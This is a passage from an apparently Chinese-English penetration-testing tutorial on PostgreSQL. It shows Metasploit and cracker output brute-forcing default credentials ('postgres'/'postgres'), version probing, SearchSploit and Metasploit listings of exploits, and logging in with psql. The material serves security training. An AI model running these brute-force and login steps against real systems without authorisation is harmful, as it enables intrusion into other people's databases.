</span></span><span class=line><span class=cl><span class=n>Rate</span><span class=p>:</span> <span class=mf>1040.39</span><span class=p>;</span> <span class=n>Found</span><span class=p>:</span> <span class=mi>1</span><span class=p>;</span> <span class=n>About</span> <span class=mf>0.03</span><span class=o>%</span> <span class=n>done</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>press</span> <span class=s1>&#39;p&#39;</span> <span class=n>to</span> <span class=n>list</span> <span class=n>discovered</span> <span class=n>credentials</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Discovered</span> <span class=n>credentials</span> <span class=k>for</span> <span class=n>psql</span> <span class=n>on</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>1.26</span> <span class=mi>5432</span><span class=o>/</span><span class=n>tcp</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=mf>192.168</span><span class=o>.</span><span class=mf>1.26</span> <span class=mi>5432</span><span class=o>/</span><span class=n>tcp</span> <span class=n>psql</span><span class=p>:</span> <span class=s1>&#39;postgres&#39;</span> <span class=s1>&#39;postgres&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>caught</span> <span class=n>SIGINT</span> <span class=k>signal</span><span class=p>,</span> <span class=n>cleaning</span> <span class=n>up</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=metasploit-postgres-login-module--https-www-dot-metasploit-dot-com><span class=section-num>4.3</span> * Metasploit - &lsquo;postgres_login&rsquo; module (<a href=https://www.metasploit.com target=_blank rel="noopener noreffer">https://www.metasploit.com</a>)</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@KaliLinux&gt; msfconsole
</span></span><span class=line><span class=cl>        &gt; auxiliary/scanner/postgres/postgres_login
</span></span><span class=line><span class=cl>        &gt; show options
</span></span><span class=line><span class=cl>        &gt; set RHOSTS &lt;Target IP&gt;
</span></span><span class=line><span class=cl>        &gt; set USERPASS_FILE /root/&lt;your_username_file&gt;
</span></span><span class=line><span class=cl>        &gt; set PASS_FILE /root/&lt;your_password_file&gt;
</span></span><span class=line><span class=cl>        &gt; exploit
</span></span></code></pre></td></tr></table></div></div><p>Example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 &gt; use auxiliary/scanner/postgres/postgres_login
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_login) &gt; options
</span></span><span class=line><span class=cl>Module options (auxiliary/scanner/postgres/postgres_login):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name              Current Setting                                                               Required  Description
</span></span><span class=line><span class=cl>   ----              ---------------                                                               --------  -----------
</span></span><span class=line><span class=cl>   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
</span></span><span class=line><span class=cl>   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
</span></span><span class=line><span class=cl>   DATABASE          template1                                                                     yes       The database to authenticate against
</span></span><span class=line><span class=cl>   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
</span></span><span class=line><span class=cl>   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
</span></span><span class=line><span class=cl>   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
</span></span><span class=line><span class=cl>   PASSWORD                                                                                        no        A specific password to authenticate with
</span></span><span class=line><span class=cl>   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
</span></span><span class=line><span class=cl>   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
</span></span><span class=line><span class=cl>   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
</span></span><span class=line><span class=cl>   RHOSTS                                                                                          yes       The target address range or CIDR identifier
</span></span><span class=line><span class=cl>   RPORT             5432                                                                          yes       The target port
</span></span><span class=line><span class=cl>   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
</span></span><span class=line><span class=cl>   THREADS           1                                                                             yes       The number of concurrent threads
</span></span><span class=line><span class=cl>   USERNAME                                                                                        no        A specific username to authenticate as
</span></span><span class=line><span class=cl>   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
</span></span><span class=line><span class=cl>   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
</span></span><span class=line><span class=cl>   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
</span></span><span class=line><span class=cl>   VERBOSE           true                                                                          yes       Whether to print output for all attempts
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_login) &gt; set RHOSTS 192.168.1.104
</span></span><span class=line><span class=cl>RHOSTS =&gt; 192.168.1.104
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_login) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[!] No active DB -- Credential data will not be saved!
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] 192.168.1.104:5432 - Login Successful: postgres:postgres@template1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
</span></span><span class=line><span class=cl>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_login) &gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=如何检测数据库是否存在已知的未修复的漏洞-例如-是否为过时的数据库版本-缺少安全补丁><span class=section-num>5</span> 如何检测数据库是否存在已知的未修复的漏洞（例如，是否为过时的数据库版本、缺少安全补丁）</h2><ul><li>第一步：使用各种工具（如 Nmap 或 Metasploit 发现模块）确定数据库的版本（版本号可能会披露在软件横幅中或者可以通过识别服务的行为等手段检测到）。如果没有数据库登录凭证，就只能采用这种方式； 如果当时已经拥有数据库的登录凭证，最好登录到数据库，确认其确切的版本号及其补丁级别。</li><li>第二步：去互联网上（例如数据库提供方的网站、www.cvedetails.com）查找版本是否还在被支持，并且是否易受已知漏洞的攻击 。</li><li>第三步：使用各种工具和资源，包括 ExploitDB / SearchSploit、Metasploit、Github
等来查找是否已经有记录的与之对应的漏洞利用方案。</li></ul><h3 id=metasploit-的-postgresql-version-probe-模块><span class=section-num>5.1</span> Metasploit 的“PostgreSQL Version Probe”模块</h3><p>除了手动使用 PGSQL 登录或使用 NMAP 之外，Metasploit 的“PostgreSQL Version Probe”模块也可以枚举 PostgreSQL
服务器的版本。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; auxiliary/scanner/postgres/postgres_version
</span></span><span class=line><span class=cl>&gt; https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_version
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 &gt; use auxiliary/scanner/postgres/postgres_version
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_version) &gt; options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options (auxiliary/scanner/postgres/postgres_version):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
</span></span><span class=line><span class=cl>   DATABASE  template1        yes       The database to authenticate against
</span></span><span class=line><span class=cl>   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
</span></span><span class=line><span class=cl>   RHOSTS                     yes       The target address range or CIDR identifier
</span></span><span class=line><span class=cl>   RPORT     5432             yes       The target port
</span></span><span class=line><span class=cl>   THREADS   1                yes       The number of concurrent threads
</span></span><span class=line><span class=cl>   USERNAME  postgres         yes       The username to authenticate as
</span></span><span class=line><span class=cl>   VERBOSE   false            no        Enable verbose output
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_version) &gt; set RHOSTS 192.168.1.104
</span></span><span class=line><span class=cl>RHOSTS =&gt; 192.168.1.104
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/postgres/postgres_version) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] 192.168.1.104:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)
</span></span><span class=line><span class=cl>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><h3 id=使用-searchsploit-在-exploitdb-数据库中查找公开的漏洞利用方法><span class=section-num>5.2</span> 使用 SearchSploit 在 ExploitDB 数据库中查找公开的漏洞利用方法</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@Security-Audit-01:~$ searchsploit postgresql
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                                                                                   |  Path
</span></span><span class=line><span class=cl>                                                                                                                                                                 | (/usr/share/exploitdb/)
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span><span class=line><span class=cl>PostgreSQL - &#39;bitsubstr&#39; Buffer Overflow                                                                                                                         | exploits/linux/dos/33571.txt
</span></span><span class=line><span class=cl>PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                                                                                                     | exploits/immunix/local/19875.txt
</span></span><span class=line><span class=cl>PostgreSQL 7.x - Multiple Vulnerabilities                                                                                                                        | exploits/linux/dos/25076.c
</span></span><span class=line><span class=cl>PostgreSQL 8.01 - Remote Reboot (Denial of Service)                                                                                                              | exploits/multiple/dos/946.c
</span></span><span class=line><span class=cl>PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                                                                               | exploits/linux/local/7855.txt
</span></span><span class=line><span class=cl>PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                                                                                                  | exploits/linux/dos/32849.txt
</span></span><span class=line><span class=cl>PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                                                                                                      | exploits/multiple/local/32847.txt
</span></span><span class=line><span class=cl>PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service                                                                                        | exploits/multiple/dos/33729.txt
</span></span><span class=line><span class=cl>PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                                                                                                | exploits/multiple/remote/46813.rb
</span></span><span class=line><span class=cl>PostgreSQL 9.4-0.5.3 - Privilege Escalation                                                                                                                      | exploits/linux/local/45184.sh
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></span></code></pre></td></tr></table></div></div><h3 id=查看-metasploit-为-postgresql-提供的可用模块和漏洞利用程序><span class=section-num>5.3</span> 查看 Metasploit 为 PostgreSQL 提供的可用模块和漏洞利用程序。</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>search</span> <span class=n>postgres</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Matching</span> <span class=n>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Name</span>                                                       <span class=n>Disclosure</span> <span class=n>Date</span>  <span class=n>Rank</span>       <span class=n>Check</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl><span class=o>----</span>                                                       <span class=o>---------------</span>  <span class=o>----</span>       <span class=o>-----</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>manageengine_pmp_privesc</span>              <span class=mi>2014</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>08</span>       <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>ManageEngine</span> <span class=n>Password</span> <span class=n>Manager</span> <span class=n>SQLAdvancedALSearchResult</span><span class=o>.</span><span class=n>cc</span> <span class=n>Pro</span> <span class=n>SQL</span> <span class=n>Injection</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>rails_devise_pass_reset</span>               <span class=mi>2013</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>28</span>       <span class=n>normal</span>     <span class=n>No</span>     <span class=n>Ruby</span> <span class=n>on</span> <span class=n>Rails</span> <span class=n>Devise</span> <span class=n>Authentication</span> <span class=n>Password</span> <span class=n>Reset</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_readfile</span>                                  <span class=n>normal</span>     <span class=n>No</span>     <span class=n>PostgreSQL</span> <span class=n>Server</span> <span class=n>Generic</span> <span class=n>Query</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_sql</span>                                       <span class=n>normal</span>     <span class=n>No</span>     <span class=n>PostgreSQL</span> <span class=n>Server</span> <span class=n>Generic</span> <span class=n>Query</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>analyze</span><span class=o>/</span><span class=n>jtr_postgres_fast</span>                                         <span class=n>normal</span>     <span class=n>No</span>     <span class=n>John</span> <span class=n>the</span> <span class=n>Ripper</span> <span class=n>Postgres</span> <span class=n>SQL</span> <span class=n>Password</span> <span class=n>Cracker</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_dbname_flag_injection</span>                   <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=n>Database</span> <span class=n>Name</span> <span class=n>Command</span> <span class=n>Line</span> <span class=n>Flag</span> <span class=n>Injection</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_hashdump</span>                                <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>Postgres</span> <span class=n>Password</span> <span class=n>Hashdump</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_login</span>                                   <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=n>Login</span> <span class=n>Utility</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_schemadump</span>                              <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>Postgres</span> <span class=n>Schema</span> <span class=n>Dump</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_version</span>                                 <span class=n>normal</span>     <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=n>Version</span> <span class=n>Probe</span>
</span></span><span class=line><span class=cl><span class=n>auxiliary</span><span class=o>/</span><span class=n>server</span><span class=o>/</span><span class=n>capture</span><span class=o>/</span><span class=n>postgresql</span>                                         <span class=n>normal</span>     <span class=n>No</span>     <span class=n>Authentication</span> <span class=n>Capture</span><span class=p>:</span> <span class=n>PostgreSQL</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span><span class=o>/</span><span class=n>linux</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_payload</span>                    <span class=mi>2007</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>05</span>       <span class=n>excellent</span>  <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=k>for</span> <span class=n>Linux</span> <span class=n>Payload</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>manage_engine_dc_pmp_sqli</span>               <span class=mi>2014</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>08</span>       <span class=n>excellent</span>  <span class=n>Yes</span>    <span class=n>ManageEngine</span> <span class=n>Desktop</span> <span class=n>Central</span> <span class=o>/</span> <span class=n>Password</span> <span class=n>Manager</span> <span class=n>LinkViewFetchServlet</span><span class=o>.</span><span class=n>dat</span> <span class=n>SQL</span> <span class=n>Injection</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_createlang</span>                 <span class=mi>2016</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>01</span>       <span class=n>good</span>       <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=n>CREATE</span> <span class=n>LANGUAGE</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span><span class=o>/</span><span class=n>windows</span><span class=o>/</span><span class=n>misc</span><span class=o>/</span><span class=n>manageengine_eventlog_analyzer_rce</span>    <span class=mi>2015</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>11</span>       <span class=n>manual</span>     <span class=n>Yes</span>    <span class=n>ManageEngine</span> <span class=n>EventLog</span> <span class=n>Analyzer</span> <span class=n>Remote</span> <span class=n>Code</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span><span class=o>/</span><span class=n>windows</span><span class=o>/</span><span class=n>postgres</span><span class=o>/</span><span class=n>postgres_payload</span>                  <span class=mi>2009</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=mi>10</span>       <span class=n>excellent</span>  <span class=n>Yes</span>    <span class=n>PostgreSQL</span> <span class=k>for</span> <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=n>Payload</span> <span class=n>Execution</span>
</span></span><span class=line><span class=cl><span class=n>post</span><span class=o>/</span><span class=n>linux</span><span class=o>/</span><span class=n>gather</span><span class=o>/</span><span class=n>enum_users_history</span>                                        <span class=n>normal</span>     <span class=n>No</span>     <span class=n>Linux</span> <span class=n>Gather</span> <span class=n>User</span> <span class=n>History</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=如何使用有效凭证登录-postgresql-数据库><span class=section-num>6</span> 如何使用有效凭证登录 PostgreSQL 数据库</h2><h3 id=postgresql-client><span class=section-num>6.1</span> * PostgreSQL client</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@KaliLinux&gt; psql -h 192.168.1.26 -U postgres -W
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password for user postgres: &lt;enter password&gt;
</span></span><span class=line><span class=cl>pgsql&gt;
</span></span><span class=line><span class=cl>pgsql&gt; SELECT VERSION();
</span></span><span class=line><span class=cl>                                       version
</span></span><span class=line><span class=cl>       -----------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>       PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 	4.2.3-2ubuntu4)
</span></span><span class=line><span class=cl>       (1 row)
</span></span><span class=line><span class=cl>pgsql&gt;
</span></span><span class=line><span class=cl>pgsql&gt; \l
</span></span><span class=line><span class=cl>                                    List of databases
</span></span><span class=line><span class=cl>      Name    |  Owner   | Encoding |   Access privileges
</span></span><span class=line><span class=cl>   -----------+----------+----------+-----------------------
</span></span><span class=line><span class=cl>    postgres  | postgres | UTF8     |
</span></span><span class=line><span class=cl>    template0 | postgres | UTF8     | =c/postgres          +
</span></span><span class=line><span class=cl>              |          |          | postgres=CTc/postgres
</span></span><span class=line><span class=cl>    template1 | postgres | UTF8     | =c/postgres          +
</span></span><span class=line><span class=cl>             |          |          | postgres=CTc/postgres
</span></span><span class=line><span class=cl>   (3 rows)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pgsql&gt;
</span></span><span class=line><span class=cl>pgsql&gt; \du
</span></span><span class=line><span class=cl>                     List of roles
</span></span><span class=line><span class=cl>     Role name |            Attributes             | Member of
</span></span><span class=line><span class=cl>    -----------+-----------------------------------+-----------
</span></span><span class=line><span class=cl>     postgres  | Superuser, Create role, Create DB | {}
</span></span></code></pre></td></tr></table></div></div><h3 id=dbvisualizer--gui-multi-database-client-https-dbvis-dot-com><span class=section-num>6.2</span> DbVisualizer (GUI multi-database client; <a href=https://dbvis.com target=_blank rel="noopener noreffer">https://dbvis.com</a>)</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@LinuxVM &gt; sudo find / -name dbvis
</span></span><span class=line><span class=cl>                /root/DbVisualizer/wrapper/classes/com/onseven/dbvis
</span></span><span class=line><span class=cl>                /root/DbVisualizer/dbvis
</span></span><span class=line><span class=cl>                /usr/local/bin/dbvis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pentester@LinuxVM &gt; sudo su
</span></span><span class=line><span class=cl>root@LinuxVM &gt; cd /root/DbVisualizer/
</span></span><span class=line><span class=cl>root@LinuxVM &gt; ./dbvis
</span></span></code></pre></td></tr></table></div></div><p>On the GUI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; Go to &#34;TOOLS&#34;
</span></span><span class=line><span class=cl>&gt; Go to &#34;New Connection Wizard&#34;
</span></span><span class=line><span class=cl>&gt; Enter &#34;PostgreSQL pentest training&#34;
</span></span><span class=line><span class=cl>&gt; Select Database Connector for PostgreSQL
